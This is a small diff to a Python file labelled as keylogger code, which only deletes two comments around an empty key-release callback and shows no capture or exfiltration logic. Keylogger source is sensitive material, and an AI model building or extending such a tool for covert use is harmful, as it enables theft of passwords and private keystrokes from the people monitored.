@@ -50,9 +50,9 @@ def on_press(key):
     except Exception as e:
         print(f"Error: {e}")
 
-# Callback for key release events (not used in this implementation)
+# Callback for key release events 
 def on_release(key):
-    pass  # Not needed for this implementation
+    pass 
 
 # Main keylogger functionality
 def main():
